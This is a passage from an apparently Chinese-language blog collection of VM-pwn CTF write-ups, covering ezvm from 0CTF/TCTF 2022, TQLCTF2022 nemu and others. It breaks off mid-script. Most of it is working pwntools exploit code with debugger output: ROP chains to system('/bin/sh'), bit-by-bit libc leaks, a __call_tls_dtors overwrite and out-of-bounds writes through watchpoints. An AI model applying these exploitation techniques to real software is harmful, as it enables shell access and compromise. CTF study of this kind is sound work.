remote(&amp;#34;host.docker.internal&amp;#34;,9999 )&#xA;elif len(sys.argv) &amp;gt; 1 and sys.argv[1] == &amp;#34;d&amp;#34;:&#xA;    p = gdb.debug(address, gdbscript = gdbscript)&#xA;else:&#xA;    p = process(address)&#xA;&#xA;def dbg():&#xA;    # gdb.attach(p)&#xA;    gdb.attach(p, gdbscript=gdbscript)&#xA;    # pause()&#xA;&#xA;def op(opcode,high,medium,low):&#xA;    ope = p32(opcode&amp;lt;&amp;lt;28 | (high&amp;amp;0x1f)&amp;lt;&amp;lt;16 | (medium&amp;amp;0x1f)&amp;lt;&amp;lt;5 | (low&amp;amp;0x1f))&#xA;    return ope&#xA;&#xA;def add(high,medium,low):&#xA;    return op(1,high,medium,low)&#xA;&#xA;def sub(high,medium,low):&#xA;    return op(2,high,medium,low)&#xA;&#xA;def load(offset,medium,src,opcode=9):&#xA;    ope = p32(opcode&amp;lt;&amp;lt;28 | (offset&amp;amp;0xfff)&amp;lt;&amp;lt;16 | (medium&amp;amp;0x1f)&amp;lt;&amp;lt;5 | (src&amp;amp;0x1f))&#xA;    return ope&#xA;&#xA;def store(offset,medium,dest,opcode=10):&#xA;    ope = p32(opcode&amp;lt;&amp;lt;28 | (offset&amp;amp;0xfff)&amp;lt;&amp;lt;16 | (medium&amp;amp;0x1f)&amp;lt;&amp;lt;5 | (dest&amp;amp;0x1f))&#xA;    return ope&#xA;&#xA;base_addr = 0x120&amp;#43;0x38&#xA;dest_offset = 0x118&#xA;#dest:&#xA;# 04:0020│ rdx rsi 0x7ffe2b9fa530 —▸ 0x7955af50f78b (__spawnix&amp;#43;875) ◂— pop rdi&#xA;#ret_addr:&#xA;# 27:0138│&amp;#43;008 0x7ffe2b9fa648 —▸ 0x5ac76e63fb9d ◂— nop&#xA;opcode = store(0xd38,0,0) #libc地址给寄存器0&#xA;opcode&amp;#43;= store(base_addr,20,1) #system的偏移给寄存器1，20这里随便设置，不和low一样就行&#xA;opcode&amp;#43;= store(base_addr&amp;#43;8,20,2) #binsh的偏移给寄存器2&#xA;opcode&amp;#43;= store(base_addr&amp;#43;0x10,20,3) #ret的偏移给寄存器3&#xA;opcode&amp;#43;= store(base_addr&amp;#43;0x18,20,4) #pop_rdi_ret偏移给寄存器4&#xA;opcode&amp;#43;= add(0,1,5) #寄存器5=寄存器0&amp;#43;system偏移=system地址&#xA;opcode&amp;#43;= add(0,2,6) #寄存器6=寄存器0&amp;#43;binsh偏移=binsh地址&#xA;opcode&amp;#43;= sub(3,0,7) #寄存器7=寄存器0-ret偏移=ret地址&#xA;opcode&amp;#43;= add(0,4,8) #寄存器8=寄存器0&amp;#43;pop_rdi_ret偏移=pop_rdi_ret地址&#xA;&#xA;opcode&amp;#43;= load(dest_offset,20,8) #pop_rdi_ret&#xA;opcode&amp;#43;= load(dest_offset&amp;#43;8,20,6) #binsh&#xA;opcode&amp;#43;= load(dest_offset&amp;#43;0x10,20,7) #ret&#xA;opcode&amp;#43;= load(dest_offset&amp;#43;0x18,20,5) #system&#xA;&#xA;opcode&amp;#43;=p32(0)&#xA;opcode&amp;#43;=p64(0x2e586) #system&#xA;opcode&amp;#43;=p64(0x1a1265) #binsh&#xA;opcode&amp;#43;=p64(0x199b) #ret&#xA;opcode&amp;#43;=p64(0xe55c1) #pop_rdi_ret&#xA;&#xA;# dbg()&#xA;sla(b&amp;#39;opcode: &amp;#39;,opcode)&#xA;&#xA;itr()&#xA;# sbase 0x40c0&#xA;&#xA;# 0x7fff2d02dd50 #main栈帧中存储opcode地址&#xA;# 0x7fff2d02dc30 #execute 中stack地址&#xA;#之间偏移为0x120&#xA;&#xA;#system = 寄存器0 &amp;#43; 0x2e586&#xA;#binsh = 寄存器0 &amp;#43; 0x1a1265&#xA;#ret = 寄存器0 - 0x199b&#xA;#pop_rdi_ret = 寄存器0 &amp;#43; 0xe55c1&#xA;&#xA;&#xA;&#xA;# pwndbg&amp;gt; sbase 0x40c0&#xA;# 00:0000│ rax rdi 0x6127080540c0 —▸ 0x759f7fe2a1ca (__libc_start_call_main&amp;#43;122) ◂— mov edi, eax&#xA;# 01:0008│         0x6127080540c8 ◂— 0&#xA;# 02:0010│         0x6127080540d0 ◂— 0&#xA;# 03:0018│         0x6127080540d8 ◂— 0&#xA;# 04:0020│         0x6127080540e0 ◂— 0&#xA;# 05:0028│         0x6127080540e8 ◂— 0&#xA;# 06:0030│         0x6127080540f0 ◂— 0&#xA;# 07:0038│         0x6127080540f8 ◂— 0&#xA;# 08:0040│         0x612708054100 ◂— 0&#xA;# 09:0048│         0x612708054108 ◂— 0&#xA;# pwndbg&amp;gt; p &amp;amp;system&#xA;# $1 = (int (*)(const char *)) 0x759f7fe58750 &amp;lt;__libc_system&amp;gt;&#xA;# pwndbg&amp;gt; search &amp;#34;/bin/sh&amp;#34;                                                       &#xA;# Searching for byte: b&amp;#39;/bin/sh&amp;#39;&#xA;# libc.so.6       0x759f7ffcb42f 0x68732f6e69622f /* &amp;#39;/bin/sh&amp;#39; */&#xA;# pwndbg&amp;gt; p/x 0x759f7fe58750 - 0x759f7fe2a1ca&#xA;# $2 = 0x2e586&#xA;# pwndbg&amp;gt; p/x 0x759f7ffcb42f - 0x759f7fe2a1ca&#xA;# $3 = 0x1a1265&#xA;&#xA;#ret指令&#xA;# 0x000000000002882f : ret &#xA;# pwndbg&amp;gt; p/x 0x759f7fe2a1ca - 0x759f7fe2882f&#xA;# $6 = 0x199b&#xA;# 寄存器1 - binsh地址 = 0x199b&#xA;&#xA;#pop_rdi_ret&#xA;# 0x000000000010f78b : pop rdi ; ret&#xA;# pwndbg&amp;gt; p/x  0x759f7ff0f78b - 0x759f7fe2a1ca&#xA;# $8 = 0xe55c1&#xA;# pop_rdi_ret - 寄存器0 = 0xe55c1&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;2020网鼎杯青龙组-boom1&#34;&gt;&lt;span&gt;2020网鼎杯青龙组-boom1&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#2020%e7%bd%91%e9%bc%8e%e6%9d%af%e9%9d%92%e9%be%99%e7%bb%84-boom1&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/news/7382?u_atoken=0095c38b74859b438aaf681829ace4ba&amp;amp;u_asig=1a0c381017440330108046584e0135&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://xz.aliyun.com/news/7382?u_atoken=0095c38b74859b438aaf681829ace4ba&amp;u_asig=1a0c381017440330108046584e0135&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;编译器类vmpwn&lt;/p&gt;&#xA;&lt;p&gt;大概看了看，程序很大，实现了一个编译器，执行我们输入的C代码。&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;malloc(0x40000u);&lt;/code&gt;会走mmap，申请的变量和libc的偏移是固定的&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;我们可以定义一个变量，从这个变量的地址寻址到&lt;code&gt;__free_hook&lt;/code&gt;和&lt;code&gt;system&lt;/code&gt;函数，将后者覆写到前者，再调用&lt;code&gt;free(&#39;/bin/sh&#39;)&lt;/code&gt;即可。&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;0ctftctf-2022-ezvm&#34;&gt;&lt;span&gt;0CTF/TCTF 2022 ezvm&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#0ctftctf-2022-ezvm&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;别的师傅WP：https://github.com/nobodyisnobody/write-ups/tree/main/0CTF.TCTF.2022/pwn/ezvm&lt;/p&gt;&#xA;&lt;p&gt;指令梳理：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;0 push: 把memory的数据压入栈中&#xA;1 pop: 栈中数据弹出到memory&#xA;2-12 ： 对栈中数据进行加减乘除等操作，并把sp-1&#xA;13 : 判断栈顶是否为0&#xA;14-16： jmp jz jnz &#xA;17-19: 比较指令&#xA;20 mov: 写8字节到bss段（类似寄存器）&#xA;21 store:指定寄存器中数据写入到memory区域&#xA;22 load:把memory中的数据写入到指定寄存器&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;交互：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;push    =   lambda bss              :p8(0)&amp;#43;p8(bss) #压入寄存器的内容到栈&#xA;and_f   =   lambda                  :p8(9)&#xA;nz      =   lambda add_ip           :p8(15)&amp;#43;p64(add_ip)&#xA;jnz     =   lambda add_ip           :p8(16)&amp;#43;p64(add_ip)&#xA;mov     =   lambda bss,imm          :p8(0x14)&amp;#43;p8(bss)&amp;#43;p64(imm) #imm-&amp;gt;寄存器&#xA;store   =   lambda bss,memory       :p8(0x15)&amp;#43;p8(bss)&amp;#43;p64(memory) #寄存器-&amp;gt;memory &#xA;load    =   lambda bss,memory       :p8(0x16)&amp;#43;p8(bss)&amp;#43;p64(memory) #mrmory-&amp;gt;寄存器             &#xA;exit_f  =   lambda                  :p8(0x17)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;关键点在于这个malloc会把size左移3个bit，传入&lt;code&gt;0x2000000000030000&lt;/code&gt;就能越界写&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;.text:0000000000002353                 mov     rax, [rbp&amp;#43;size_1]&#xA;.text:0000000000002357                 shl     rax, 3&#xA;.text:000000000000235B                 mov     [rbp&amp;#43;var_10], rax&#xA;.text:000000000000235F                 mov     rax, [rbp&amp;#43;var_10]&#xA;.text:0000000000002363                 mov     rdi, rax        ; size&#xA;.text:0000000000002366                 call    _malloc&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;思路：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;free一个堆块进unsorted bin，memory 区域会留下libc&lt;/li&gt;&#xA;&lt;li&gt;爆破出libc&lt;/li&gt;&#xA;&lt;li&gt;利用&lt;code&gt;__call_tls_dtors&lt;/code&gt;来getshell&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;exp-3&#34;&gt;&lt;span&gt;exp&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#exp-3&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h3&gt;&lt;p&gt;不知道为什么最后&lt;code&gt;bye bye&lt;/code&gt;的时候退不出去。。&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;from pwn import *&#xA;context.terminal = [&amp;#34;tmux&amp;#34;, &amp;#34;splitw&amp;#34;, &amp;#34;-h&amp;#34;,&amp;#34;-p&amp;#34;,&amp;#34;65&amp;#34;,&amp;#34;-b&amp;#34;]&#xA;context(os=&amp;#39;linux&amp;#39;,arch=&amp;#39;amd64&amp;#39;,log_level=&amp;#39;debug&amp;#39;)&#xA;&#xA;address = &amp;#39;./pwn&amp;#39;&#xA;# address = &amp;#39;./pwn_patched&amp;#39;&#xA;elf = ELF(address)&#xA;libc = elf.libc&#xA;&#xA;#-----------------------------------------------------------------&#xA;s       = lambda data               :p.send(data)&#xA;ss      = lambda data               :p.send(str(data))&#xA;sa      = lambda delim,data         :p.sendafter(delim, data)&#xA;sl      = lambda data               :p.sendline(data)&#xA;sls     = lambda data               :p.sendline(str(data))&#xA;sla     = lambda delim,data         :p.sendlineafter(delim, data)&#xA;r       = lambda num                :p.recv(num)&#xA;ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)&#xA;itr     = lambda                    :p.interactive()&#xA;uu32    = lambda data               :u32(data.ljust(4,b&amp;#39;\x00&amp;#39;))&#xA;uu64    = lambda data               :u64(data.ljust(8,b&amp;#39;\x00&amp;#39;))&#xA;# lg      = lambda s,addr&#x9;&#x9;        : log.info(&amp;#39;\033[1;31;40m %s --&amp;gt; 0x%x \033[0m&amp;#39; % (s,addr))&#xA;lg      = lambda s&#x9;&#x9;&#x9;        : log.info(&amp;#39;\033[1;31;40m %s --&amp;gt; 0x%x \033[0m&amp;#39; % (s, eval(s)))&#xA;l64     = lambda                    :u64(p.recvuntil(&amp;#34;\x7f&amp;#34;)[-6:].ljust(8,b&amp;#34;\x00&amp;#34;))&#xA;l32     = lambda                    :u32(p.recvuntil(&amp;#34;\xf7&amp;#34;)[-4:].ljust(4,b&amp;#34;\x00&amp;#34;))&#xA;r64     = lambda                    :u64(p.recv(6).ljust(8,b&amp;#39;\x00&amp;#39;))&#xA;ir64    = lambda                    :int(p.recv(14),16)&#xA;#-----------------------------------------------------------------&#xA;gdbscript = \&#xA;&amp;#34;&amp;#34;&amp;#34;&#xA;    # bbase 0x23BF #call execute&#xA;    # bbase 0x2353 #malloc&#xA;    # bbase 0x228E #out malloc&#xA;    bbase 0x14e2 #free&#xA;    # bbase 0x1a0d #shr&#xA;    # bbase 0x1582 #switch&#xA;    # bbase 0x246F #exit&#xA;    c&#xA;&amp;#34;&amp;#34;&amp;#34;&#xA;if len(sys.argv) &amp;gt; 1 and sys.argv[1] == &amp;#34;r&amp;#34;:&#xA;    p = remote(&amp;#34;host.docker.internal&amp;#34;,9999 )&#xA;elif len(sys.argv) &amp;gt; 1 and sys.argv[1] == &amp;#34;d&amp;#34;:&#xA;    p = gdb.debug(address, gdbscript = gdbscript)&#xA;else:&#xA;    p = process(address)&#xA;&#xA;def dbg():&#xA;    gdb.attach(p)&#xA;    # gdb.attach(p, gdbscript=gdbscript)&#xA;    # pause()&#xA;&#xA;push    =   lambda bss              :p8(0)&amp;#43;p8(bss) #压入寄存器的内容到栈&#xA;and_f   =   lambda                  :p8(9)&#xA;nz      =   lambda add_ip           :p8(15)&amp;#43;p64(add_ip)&#xA;jnz     =   lambda add_ip           :p8(16)&amp;#43;p64(add_ip)&#xA;mov     =   lambda bss,imm          :p8(0x14)&amp;#43;p8(bss)&amp;#43;p64(imm) #imm-&amp;gt;寄存器&#xA;store   =   lambda bss,memory       :p8(0x15)&amp;#43;p8(bss)&amp;#43;p64(memory) #寄存器-&amp;gt;memory &#xA;load    =   lambda bss,memory       :p8(0x16)&amp;#43;p8(bss)&amp;#43;p64(memory) #mrmory-&amp;gt;寄存器             &#xA;exit_f  =   lambda                  :p8(0x17)&#xA;&#xA;#让memory为main_arena地址&#xA;sla(b&amp;#39;0ctf2022!!\n&amp;#39;,b&amp;#39;aaaa&amp;#39;)&#xA;opcode = exit_f()&#xA;sla(b&amp;#39;code size:\n&amp;#39;,str(len(opcode)))&#xA;sla(b&amp;#39;memory count:\n&amp;#39;,str(0x410&amp;gt;&amp;gt;3))&#xA;sla(b&amp;#39;input your code:\n&amp;#39;,opcode)&#xA;&#xA;# sla(b&amp;#39;continue?\n&amp;#39;,b&amp;#39;c&amp;#39;)&#xA;&#xA;#爆破获取libc&#xA;libc_base = 0x700000000000&#xA;for i in range(4,45,1):&#xA;    print(&amp;#39;leaking bit &amp;#39;&amp;#43;str(i))&#xA;    opcode = mov(0,1&amp;lt;&amp;lt;i)        #bitmask存入r0&#xA;    opcode&amp;#43;= push(0)            #bitmask 压栈&#xA;    opcode&amp;#43;= load(1,0)          #main_arena地址存入r1&#xA;    opcode&amp;#43;= push(1)            #r1压栈&#xA;    opcode&amp;#43;= and_f()            #bit_mask 和 main_arena 与运算&#xA;    opcode&amp;#43;= jnz(1)             #该bit为0就exit&#xA;    opcode&amp;#43;= b&amp;#39;\x18&amp;#39; &amp;#43; exit_f()&#xA;&#xA;    sla(b&amp;#39;code size:\n&amp;#39;,str(len(opcode)))&#xA;    sla(b&amp;#39;memory count:\n&amp;#39;,str(0x410&amp;gt;&amp;gt;3))&#xA;    sla(b&amp;#39;input your code:\n&amp;#39;,opcode)&#xA;&#xA;    buffer = ru(b&amp;#39;finish!\n&amp;#39;,drop=True)&#xA;    if b&amp;#39;what&amp;#39; in buffer:&#xA;        libc_base |= 1&amp;lt;&amp;lt;i&#xA;    &#xA;libc_base -= 0x219ce0&#xA;libc.address = libc_base&#xA;lg(&amp;#34;libc_base&amp;#34;)&#xA;&#xA;def rol(value):&#xA;    return (value &amp;lt;&amp;lt; 0x11) | (value &amp;gt;&amp;gt; (64 - 0x11)) &amp;amp; 0xffffffffffffffff&#xA;dest = rol(libc.sym[&amp;#39;system&amp;#39;])&#xA;&#xA;#$fs_base &amp;#43; 0x30（randnumber） 置0 &#xA;#0x181760 fs_base&amp;#43;0x30&#xA;opcode = store(0,0x302ec) # clear rand val&#xA;opcode&amp;#43;= mov(0,libc_base - 0x2a00)&#xA;#0x1816d8 $fs_base - 88&#xA;opcode&amp;#43;= store(0,0x302db) # rbp val&#xA;opcode&amp;#43;= mov(0,dest)&#xA;#0x1815f0  $fs_base - 0x140&#xA;opcode&amp;#43;= store(0,0x302be) # rbp val &#xA;opcode&amp;#43;= mov(0,next(libc.search(b&amp;#39;/bin/sh&amp;#39;)))&#xA;#0x1815f8  $fs_base - 0x138&#xA;opcode&amp;#43;= store(0,0x302bf) # rbp val&#xA;opcode&amp;#43;= exit_f()&#xA;sla(b&amp;#39;code size:\n&amp;#39;,str(len(opcode)))&#xA;sla(b&amp;#39;memory count:\n&amp;#39;,str(0x2000000000030000))&#xA;sl(opcode)&#xA;dbg()&#xA;sla(b&amp;#39;continue?&amp;#39;, b&amp;#34;bye bye\x00&amp;#34;)&#xA;&#xA;&#xA;itr()&#xA;# p/x $fs_base&#xA;&#xA;# opcode_ptr memory_ptr stack_ptr opcodesize mesize&#xA;# sbase 0x5040&#xA;&#xA;#stack sp&#xA;#sbase 0x5090&#xA;&#xA;# dq 0x181760 &amp;#43; memory_ptr&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;tqlctf2022_nemu&#34;&gt;&lt;span&gt;TQLCTF2022_nemu&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#tqlctf2022_nemu&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;blockquote&gt;&#xA;&lt;p&gt;别的师傅评价：一个完全无限制的越界读写问题。但是看似简单，读写操作的时候还需要经过一些检查。很值得一做。很适合作为VM pwn的入门题目仔细分析(正好也有源码，漏洞很经典)&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;这题主要考点：&lt;code&gt;理解⼀个模拟器及调试器的整体架构&lt;/code&gt;，给了源码&lt;/p&gt;&#xA;&lt;p&gt;交互：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;help:查看所有指令description&#xA;si:单步执行1次&#xA;si 2:单步执行2次&#xA;c:一直执行&#xA;info r:查看寄存器&#xA;info w:查看断点&#xA;x 0x100005 :查看内容&#xA;x 4 0x100000：查看4个dword内容&#xA;w *0x100000：设置watch point&#xA;d 1:删除第一个watch point&#xA;set &amp;lt;地址&amp;gt; &amp;lt;数据&amp;gt;：修改数据&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里比较重要的就是&lt;code&gt;guest_to_host&lt;/code&gt;这个宏&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;uint32_t vaddr_read(vaddr_t addr, int len) {&#xA;  return paddr_read(addr, len);&#xA;}&#xA;&#xA;uint32_t paddr_read(paddr_t addr, int len) {&#xA;  return pmem_rw(addr, uint32_t) &amp;amp; (~0u &amp;gt;&amp;gt; ((4 - len) &amp;lt;&amp;lt; 3));&#xA;}&#xA;&#xA;&#xA;#define pmem_rw(addr, type) *(type *)({\&#xA;    guest_to_host(addr); \&#xA;    })&#xA;&#xA;/* convert the guest physical address in the guest program to host virtual address in NEMU */&#xA;#define guest_to_host(p) ((void *)(pmem &amp;#43; (unsigned)p))&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个宏的&lt;code&gt;p&lt;/code&gt;是真实的物理地址&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;pwndbg&amp;gt; disass vaddr_read&#xA;Dump of assembler code for function vaddr_read:&#xA;   0x0000000000406ee0 &amp;lt;&amp;#43;0&amp;gt;:     mov    ecx,0x4&#xA;   0x0000000000406ee5 &amp;lt;&amp;#43;5&amp;gt;:     mov    edi,edi&#xA;   0x0000000000406ee7 &amp;lt;&amp;#43;7&amp;gt;:     mov    eax,0xffffffff&#xA;   0x0000000000406eec &amp;lt;&amp;#43;12&amp;gt;:    sub    ecx,esi&#xA;   0x0000000000406eee &amp;lt;&amp;#43;14&amp;gt;:    shl    ecx,0x3&#xA;   0x0000000000406ef1 &amp;lt;&amp;#43;17&amp;gt;:    shr    eax,cl&#xA;   0x0000000000406ef3 &amp;lt;&amp;#43;19&amp;gt;:    and    eax,DWORD PTR [rdi&amp;#43;0x6a3b80]&#xA;   0x0000000000406ef9 &amp;lt;&amp;#43;25&amp;gt;:    ret&#xA;End of assembler dump.&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查看汇编可以看到&lt;code&gt;0x6a3b80&lt;/code&gt;就是&lt;code&gt;p&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;pwndbg&amp;gt; dq 0x6a3b80&amp;#43;0x100000&#xA;0x7a3b80 &amp;lt;pmem&amp;#43;1048576&amp;gt;:        0x0027b900001234b8      0x0441c76601890010&#xA;0x7a3b90 &amp;lt;pmem&amp;#43;1048592&amp;gt;:        0x6600000002bb0001      0x01ffffe0009984c7&#xA;0x7a3ba0 &amp;lt;pmem&amp;#43;1048608&amp;gt;:        0x00d600000000b800      0x0000000000000000&#xA;0x7a3bb0 &amp;lt;pmem&amp;#43;1048624&amp;gt;:        0x0000000000000000      0x0000000000000000&#xA;&#xA;100000:   b8 34 12 00 00                        movl $0x1234,%eax&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里也对应上了&lt;/p&gt;&#xA;&lt;p&gt;而这里也没有对于边界的检查，所以可以进行越界读，set可以进行越界写&lt;/p&gt;&#xA;&lt;p&gt;这里需要通过watchpoint去泄露&lt;/p&gt;&#xA;&lt;p&gt;watchpoint数据结构&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;typedef struct watchpoint {&#xA;  int NO;&#xA;  struct watchpoint *next;&#xA;&#xA;  /* TODO: Add more members if necessary */&#xA; char exp[30];&#xA; uint32_t old_val;&#xA; uint32_t new_val;&#xA;&#xA;} WP;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;考虑结构体内存对齐，实际上的内存结构：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;typedef struct watchpoint {&#xA;    int NO;                     // Offset: 0x0, Size: 0x4 bytes&#xA;    struct watchpoint *next;    // Offset: 0x4, Size: 0x8 bytes&#xA;&#xA;    /* TODO: Add more members if necessary */&#xA;    char exp[30];               // Offset: 0x10, Size: 0x1e bytes&#xA;    uint32_t old_val;           // Offset: 0x30, Size: 4 bytes&#xA;    uint32_t new_val;           // Offset: 0x34, Size: 4 bytes&#xA;} WP;&#xA;//总共0x38&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;list_watchpoint:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;void list_watchpoint(){&#xA;    WP *head2 = head;&#xA;    if(head == NULL) {&#xA;        printf(&amp;#34;No watch pint to delete\n&amp;#34;);&#xA;        return;&#xA;    }&#xA;    printf(&amp;#34;NO Expr               Old Value               New Value\n&amp;#34;);&#xA;    while(head2){&#xA;        printf(&amp;#34;%d  %-18s %#x               %#x\n&amp;#34;,head2-&amp;gt;NO,head2-&amp;gt;exp,head2-&amp;gt;old_val,head2-&amp;gt;new_val);&#xA;        head2 = head2-&amp;gt;next;&#xA;    }&#xA;    return;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;pwndbg&amp;gt; p &amp;amp;head&#xA;$7 = (WP **) 0x86a3fc8 &amp;lt;head&amp;gt;&#xA;&#xA;pwndbg&amp;gt; x/8gx 0x60f018-0x20&#xA;0x60eff8:       0x0000000000000000      0x000000000060ee18&#xA;0x60f008:       0x00007d7a583572e0      0x00007d7a583332f0&#xA;0x60f018 &amp;lt;__snprintf_chk@got.plt&amp;gt;:      0x00007d7a58137d30      0x00007d7a580add30&#xA;0x60f028 &amp;lt;putchar@got[plt]&amp;gt;:    0x0000000000401506      0x0000000000401516&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这里要让libc地址位于head+0x30处，就能通过old_val  new_val泄露出libc地址&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;#pwndbg&amp;gt; p/x 0x86a3fc8-0x6a3b80&#xA;#$1 = 0x8000448&#xA;sl(b&amp;#39;set 0x8000448 0x60eff0&amp;#39;)&#xA;# dbg()&#xA;sl(b&amp;#39;info w&amp;#39;)&#xA;ru(b&amp;#39;New Value&amp;#39;)&#xA;ru(b&amp;#39;0x&amp;#39;)&#xA;libc_low = int(p.recv(8),16)&#xA;ru(b&amp;#39;0x&amp;#39;)&#xA;libc_high = 